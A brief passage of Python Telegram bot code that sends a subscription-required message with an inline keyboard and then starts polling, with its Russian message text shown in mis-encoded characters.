   bot.send_message(message.chat.id, '–í—ã –Ω–µ –ø–æ–¥–ø–∏—Å–∞–Ω—ã –Ω–∞ –Ω–∞—à –∫–∞–Ω–∞–ª.\n–ü–æ–¥–ø–∏—à–∏—Ç–µ—Å—å –Ω–∞ –Ω–µ–≥–æ, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –±–æ—Ç—É.', reply_markup = inl_keyboard)
                
bot.polling(none_stop=True, interval=0)

